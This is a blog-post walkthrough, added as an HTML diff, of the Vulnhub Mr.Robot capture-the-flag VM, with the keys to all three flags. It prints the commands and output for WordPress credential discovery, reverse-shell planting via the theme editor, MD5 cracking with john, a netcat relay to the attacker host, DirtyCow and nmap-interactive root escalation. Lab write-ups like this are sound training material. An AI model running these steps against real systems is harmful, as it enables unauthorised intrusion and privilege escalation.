@@ -1,0 +1,401 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>[Vulnhub] Mr.Robot - Walkthrough &middot; M1r4c13</title>
+<meta name="description" content="[Vulnhub] Mr.Robot - Walkthrough -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">[Vulnhub] Mr.Robot - Walkthrough</h1>
+<p class="meta"><span class="mono meta-date">2017.08.29</span><span class="tags"><span class="chip mono">vulnhub</span><span class="chip mono">ctf</span></span></p>
+<div class="post-body"><p><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">VM Download page</a></p>
+<pre><code>Victim: 192.168.56.101
+Attacker: 192.168.56.102
+</code></pre>
+<hr>
+<p><strong>Recon</strong></p>
+<p>First a quick nmap scan:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/mrrobot# nmap -sC -Pn 192.168.56.101
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-29 14:25 EDT
+Nmap scan report for whoismrrobot.com (192.168.56.101)
+Host is up (-0.052s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE
+22/tcp  closed ssh
+80/tcp  open   http
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   https
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+MAC Address: 08:00:27:C0:2C:86 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds
+</code></pre>
+<p>Check out the 80 port:</p>
+<p><img alt="" src="/blog/images/2017/08/mrrobot0.png"></p>
+<p>It's an awesome web page which emulates the show.</p>
+<p>I tried every command available here and there is anything but useful info. (there are even several videos about Mr.R凸b凸t)</p>
+<hr>
+<p><strong>Start to hunt the prey</strong></p>
+<p>Check out /robots.txt:</p>
+<pre><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre>
+<p>There is the first flag:<br>
+<strong>073403c8a58a1f80d943455fb30724b9</strong></p>
+<p><em>fsocity.dic</em> this must be a dictionary.<br>
+Let's dirb with this .dic:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/mrrobot# dirb http://192.168.56.101 fsocity.dic 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Aug 29 16:00:38 2017
+URL_BASE: http://192.168.56.101/
+WORDLIST_FILES: fsocity.dic
+
+-----------------
+
+GENERATED WORDS: 11452                                                         
+
+---- Scanning URL: http://192.168.56.101/ ----
+==&gt; DIRECTORY: http://192.168.56.101/images/                                   
+==&gt; DIRECTORY: http://192.168.56.101/css/                                      
+==&gt; DIRECTORY: http://192.168.56.101/image/                                    
++ http://192.168.56.101/license (CODE:200|SIZE:309)                            
+==&gt; DIRECTORY: http://192.168.56.101/feed/                                     
+==&gt; DIRECTORY: http://192.168.56.101/video/                                    
+==&gt; DIRECTORY: http://192.168.56.101/audio/                                    
+==&gt; DIRECTORY: http://192.168.56.101/admin/                                    
+==&gt; DIRECTORY: http://192.168.56.101/blog/                                     
+==&gt; DIRECTORY: http://192.168.56.101/Image/                                    
++ http://192.168.56.101/intro (CODE:200|SIZE:516314)                           
++ http://192.168.56.101/rss (CODE:301|SIZE:0)                                  
++ http://192.168.56.101/login (CODE:302|SIZE:0)                                
++ http://192.168.56.101/readme (CODE:200|SIZE:64)            
+
+...
+-----------------
+END_TIME: Tue Aug 29 16:34:36 2017
+DOWNLOADED: 12185 - FOUND: 5
+</code></pre>
+<p>Then I start to browse all those links and check the source code and the network traffic at the same time.</p>
+<p>It appears that this is a wordpress (:D) blog. But there is nothing interesting after I fired wpscan with several combs of parameters.</p>
+<p>So I kept checking all the urls.<br>
+When checking /license, I saw a blank page except the following line:</p>
+<pre><code>what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+</code></pre>
+<p>But if you scroll down or check the source code, you'll find a key:</p>
+<pre><code>do you want a password or something?
+ZWxsaW90OkVSMjgtMDY1Mgo=
+</code></pre>
+<pre><code class="language-bash">root@kali:~/vulnerhub/mrrobot# echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d
+elliot:ER28-0652
+</code></pre>
+<p>Great, now we have a login credential.</p>
+<p>BTW, I checked the password in the .dic and found:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/mrrobot# grep ER28-0652 fsocity.dic 
+ER28-0652
+</code></pre>
+<p>And later on I reallize that you might be able to find a url like "......./author/elliot", then you can just brute force into it with hydra and that .dic.</p>
+<p>But anyway, we are now logined in the wp.</p>
+<hr>
+<p><strong>Get a shell</strong></p>
+<p>I tried to zip a php-reverse-shell.php and upload the zip file as a plugin and planning to active it to receive the shell but it didn't worked.</p>
+<p>Then the super <a href="http://evilC.com">Chao(also known as evilC)</a> came across and gave a big hint: navigate to appearence/editor, click a header.php or something.php on the right side, add your shell php code into the content, update it, then browse the wp blog and enjoy your shell. It works!</p>
+<pre><code class="language-bash">$ id    
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$ w
+ 19:08:17 up  1:37,  0 users,  load average: 0.00, 0.01, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+$ uname -a
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+$ python -c &quot;import pty;pty.spawn('/bin/bash');&quot;
+daemon@linux:/$ 
+</code></pre>
+<hr>
+<p><strong>Get robot priviledge</strong></p>
+<pre><code class="language-bash">daemon@linux:/home/robot$ ls -l
+ls -l
+total 8
+-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre>
+<p>We need to get the priviledge of robot or root to get the second flag. And there happens be a password file under robot's home. "what a coincident!" :D</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/mrrobot# john --format=raw-md5 pwd.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefghijklmnopqrstuvwxyz (?)
+1g 0:00:00:00 DONE (2017-08-29 16:49) 6.666g/s 269360p/s 269360c/s 269360C/s abygail..TERRELL
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p>Cool, now we have robot's passwd!</p>
+<pre><code class="language-bash">daemon@linux:/home/robot$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+robot@linux:~$ id
+id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt 
+822c73956184f694993bede3eb39f959
+</code></pre>
+<p>Second flag: <strong>822c73956184f694993bede3eb39f959</strong></p>
+<hr>
+<p><strong>Finding my way to root</strong></p>
+<pre><code class="language-bash">robot@linux:/home$ ls -l
+ls -l
+total 4
+drwxr-xr-x 2 root root 4096 Nov 13  2015 robot
+</code></pre>
+<pre><code class="language-bash">robot@linux:~$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
+</code></pre>
+<p>There are 3 users that have a home but actually there is only one folder under /home which is robot. So I didn't give them too much thoughts.</p>
+<pre><code class="language-bash">robot@linux:/home$ netstat -nplt
+netstat -nplt
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::443                  :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+</code></pre>
+<p>There are ftp, mysql and another 2812 port service running, good.</p>
+<pre><code class="language-bash">robot@linux:/var$ ls
+ls
+backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp
+robot@linux:/var$ cd mail
+cd mail
+robot@linux:/var/mail$ ls
+ls
+robot@linux:/var/mail$ cd ..
+cd ..
+robot@linux:/var$ ls
+ls
+backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp
+robot@linux:/var$ cd back   
+cd backups/
+robot@linux:/var/backups$ ls
+ls
+apt.extended_states.0  group.bak    passwd.bak
+dpkg.status.0          gshadow.bak  shadow.bak
+robot@linux:/var/backups$ cat pass  
+cat passwd.bak 
+cat: passwd.bak: Permission denied
+robot@linux:/var/backups$ ls -la
+ls -la
+total 356
+drwxr-xr-x  2 root root     4096 Nov 13  2015 .
+drwxr-xr-x 11 root root     4096 Jun 24  2015 ..
+-rw-r--r--  1 root root     7194 Jun 24  2015 apt.extended_states.0
+-rw-r--r--  1 root root   331144 Jun 24  2015 dpkg.status.0
+-rw-------  1 root root      604 Nov 13  2015 group.bak
+-rw-------  1 root shadow    496 Nov 13  2015 gshadow.bak
+-rw-------  1 root root     1217 Nov 13  2015 passwd.bak
+-rw-------  1 root shadow    885 Nov 13  2015 shadow.bak
+</code></pre>
+<p>Nothing interesting here.</p>
+<pre><code class="language-bash">robot@linux:/var/log$ find / -xdev -perm /6000 \( -user root -o -group root \) 2&gt;/dev/null
+&lt;/ -xdev -perm /6000 \( -user root -o -group root \) 2&gt;/dev/null             
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/mail-touchlock
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/screen
+/usr/bin/mail-unlock
+/usr/bin/mail-lock
+/usr/bin/chsh
+/usr/bin/crontab
+/usr/bin/chfn
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/expiry
+/usr/bin/dotlockfile
+/usr/bin/sudo
+/usr/bin/ssh-agent
+/usr/bin/wall
+/usr/local/bin/nmap
+/usr/local/share/xml
+/usr/local/share/xml/schema
+/usr/local/share/xml/declaration
+/usr/local/share/xml/misc
+/usr/local/share/xml/entities
+/usr/local/share/ca-certificates
+/usr/local/share/sgml
+/usr/local/share/sgml/dtd
+/usr/local/share/sgml/declaration
+/usr/local/share/sgml/stylesheet
+/usr/local/share/sgml/misc
+/usr/local/share/sgml/entities
+/usr/local/share/fonts
+/usr/local/lib/python2.7
+/usr/local/lib/python2.7/dist-packages
+/usr/local/lib/python2.7/site-packages
+/usr/local/lib/python3.4
+/usr/local/lib/python3.4/dist-packages
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+/var/local
+/var/mail
+/sbin/unix_chkpwd
+</code></pre>
+<p>Nothing interesting here too except /usr/local/bin/nmap. (wtf? there is a nmap?) So I scaned myself with nmap (just for fun :D)</p>
+<pre><code class="language-bash">robot@linux:/var$ nmap localhost    
+nmap localhost
+
+Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2017-08-29 19:22 UTC
+Interesting ports on localhost (127.0.0.1):
+(The 1658 ports scanned but not shown below are in state: closed)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+443/tcp  open  https
+3306/tcp open  mysql
+</code></pre>
+<p>But it turns out that it is because my limited knowledge. I could root through this nmap. I'll talk about it at the end.</p>
+<p>Back to my recon work.<br>
+I tried to connect to ftp server but didn't figure out the username. Then I found this:</p>
+<pre><code class="language-bash">robot@linux:/etc$ cat ftpuser   
+cat ftpusers 
+# /etc/ftpusers: list of users disallowed FTP access. See ftpusers(5).
+
+root
+daemon
+bin
+sys
+sync
+games
+man
+lp
+mail
+news
+uucp
+nobody
+</code></pre>
+<p>And this:</p>
+<pre><code class="language-bash">robot@linux:/etc$ cat vsftpd.all    
+cat vsftpd.allowed_users 
+bitnamiftp
+</code></pre>
+<p>Alright, now we have a new target: <strong>bitnamiftp</strong>. Remember, this name also appeared in /etc/passwd</p>
+<p>I tryed mysql and got nothing too there.</p>
+<p>Then I nc to 2812 port (because it appeared in the output of <em>netstat</em>), it didn't say anything to me so I suppose it might be a web server. So I send <code>GET / HTTP/1.1</code> and hit enter twice, I got some html code back.</p>
+<p>At this point, I really want to browse the content in a browser because I saw 'mysql and 'ftp' appeared in the shit-like html code.</p>
+<p>So I built a tmp proxy (two proxy actually)<br>
+on my kali machine:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/mrrobot# mknod backpipe p
+root@kali:~/vulnerhub/mrrobot# nc -l -k -p 9000 0&lt;backpipe | nc -l -k -p 9001 | tee backpipe
+</code></pre>
+<p>on the victim machine:</p>
+<pre><code class="language-bash">robot@linux:/tmp$ mknod backpipe p
+robot@linux:/tmp$ nc localhost 2812 0&lt;backpipe | nc 192.168.56.102 9001 | tee backpipe
+</code></pre>
+<p>Then I type localhost:9000 in the browser of my kali, I can browser it now! but I need to rerun those two lines of nc command every time when I click a new link. Because the server would close the connection after one communication but anyway.</p>
+<p><img alt="" src="/blog/images/2017/08/mrrobot.png"></p>
+<p>Turns out this is a Monit Service Manager page.<br>
+I rerun those two lines of nc and browse to apache<br>
+<img alt="" src="/blog/images/2017/08/mrrobot.2.png"></p>
+<p>Here, ammmmm, I thought I found the name again: bitnamiftp, but it turns out it's not the name username.. which killed me a lot of time to check the /opt/bitnami/ directory.</p>
+<hr>
+<p><strong>Actual root</strong></p>
+<p>After all those works, I decided to use the dirty way to root it...<br>
+(actually I'd been holding this idea back since I saw that uname -a saying the kernel is 3.13.0.)</p>
+<p>I tried overlayfs, didn't work, then 'super' dirtyroot, it worked!</p>
+<pre><code class="language-bash">robot@linux:/tmp$ ./cowroot
+./cowroot
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+Size of binary: 47032
+Racing, this may take a while..
+thread stopped
+thread stopped
+/usr/bin/passwd overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+root@linux:/tmp# id
+id
+uid=0(root) gid=1002(robot) groups=0(root),1002(robot)
+root@linux:/tmp# cd /root
+cd /root
+root@linux:/root# ls
+ls
+firstboot_done  key-3-of-3.txt
+root@linux:/root# cat key   
+cat key-3-of-3.txt 
+04787ddef27c3dee1ee161b21670b4e4
+</code></pre>
+<p>Third flag: <strong>04787ddef27c3dee1ee161b21670b4e4</strong><br>
+Great! Now I'm done.</p>
+<hr>
+<p><strong>nmap to root</strong></p>
+<p>if you type <code>nmap --interactive</code>, then <code>!sh</code>, you are root. (god damm it how can I know about this at this late! but thanks god I know it know).<br>
+I learned this from <a href="https://www.youtube.com/watch?v=1-a-P1Q2AnA">this video</a>. Thanks a lot!<br>
+But if you type <code>!bash</code>, you won't get a shell and I don't know why. If someone know the reason, please do leave a message and teach me about this.</p>
+<p><strong>flag ?∈ hash</strong></p>
+<p>After the root, I checked others' walkthrough and someone said it's might be a md5 hash string and I didn't realize that before. <br>
+So I tried to decode it with both fsocity.dic and rockyou.txt, and also in md5decrypt.net but didn't get anything interested so I suppose they are just flags rather than hints.</p>
+<p>Alright, thanks for watching! <br>
+Enjoy!</p></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
